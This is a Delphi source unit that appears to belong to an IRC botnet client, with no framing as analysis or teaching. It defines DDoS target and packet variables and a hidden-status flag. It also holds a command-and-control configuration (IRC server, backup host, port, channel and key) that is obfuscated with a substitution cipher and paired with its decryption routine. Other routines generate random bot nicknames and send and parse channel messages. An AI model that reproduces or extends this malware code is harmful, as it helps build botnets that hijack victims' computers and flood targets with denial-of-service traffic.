   unit untSettings;

   interface
   Uses windows,Winsock;

   FUNCTION getip(HostName:STRING) : STRING;
   Function StripMsg(Text:String):String;
   Function KillServ(Bott:Integer):Integer;
   Function SendText(Bott:Integer; Text:String):Integer;
   Function NewNick(Size:Integer):String;
   function Decrypt(str:string):string;

    Var
     // Settings
     Silence : Boolean = False;
     PingTalk : Boolean = False;
     NetBiosTalk : Boolean = False;
     AutoNick : Boolean = False;
     AllowIntegers : Boolean = False;
     JoinedChan : Boolean = False;
     IsConnected : Boolean = False;
     HiddenStatus : Boolean = True;
     IsUpdate : Boolean = False;
     // ddos
     dip1:string;
     dip2:string;
     dport1:string;
     dport2:string;
     dpacket:string;
     ddelay:string;
     mutex:thandle;

     // Config
     NickLength : Integer = 10;

     // Other
     BatFile : TextFile;

     // irc.galaxynet.org
     Bot : TSocket;
     abc1 : string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |.';
     abc2 : string = 'EgVw|Npl0CdSu8Kn1DfUxaPr5IjYAbRt6JkhXz Oq3GiZBcQv7L.2FeWy9Mo4HsTm';
     Server : String = 'nKd|mEUlmVr'; // irc.galaxynet.org    82.3.97.99  p0ke.ath.cx
     Port : String = 'MMMo'; // 6667
     Channel : String = '#n|80rr'; // #penixx
     Key : String = 'nxg0VV'; // pubicc
     Password : string = 'fUNx';

   implementation

   function Decrypt(str:string):string;
   var
   i,j:integer;
   ch:string;
   c:boolean;
   begin
   result:='';
   for i:=1 to length(str) do begin
    ch := copy(str,i,1);
    c:=false;
    for j:=1 to length(ABC2) do begin
     if copy(ABC2,j,1)=ch then begin
      result:=result+copy(ABC1,j,1);
      c := true;
     end;
    end;
     if not c then result := result + ch;
   end;
   end;

   Function NewNick(Size:Integer):String;
   Var
    Nick:String;
   Begin
    Randomize;
    If Size = 0 then Size := Random(40);
    Nick := Copy(Abc1, Random(53),1);
    Repeat
     Nick := Nick + Copy(Abc1, Random(53),1);
    Until Length(Nick) = (Size-1);
    Result := 'FOG'+Nick;
   End;

   Function KillServ(Bott:Integer):Integer;
   Begin
    ShutDown(Bott, 2);
    Result := CloseSocket(Bott);
    JoinedChan := False;
   End;

   Function SendText(Bott:Integer; Text:String):Integer;
   Begin
    Result := Send(Bott, Text[1], Length(Text), 0);
   End;

   Function StripMsg(Text:String):String;
   Begin
    If Pos('PRIVMSG',Text)>0 Then
     Text := Copy(Text, Pos('PRIVMSG',Text)+8, Length(Text));
    If Pos(':',Text)>0 Then
     Text := Copy(Text, Pos(':',Text)+1, Length(Text));
    If Pos(#13#10, Text)>0 Then
     Text := Copy(Text, 1, Pos(#13#10,Text)-1);
    Result := Text;
   End;

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   end.
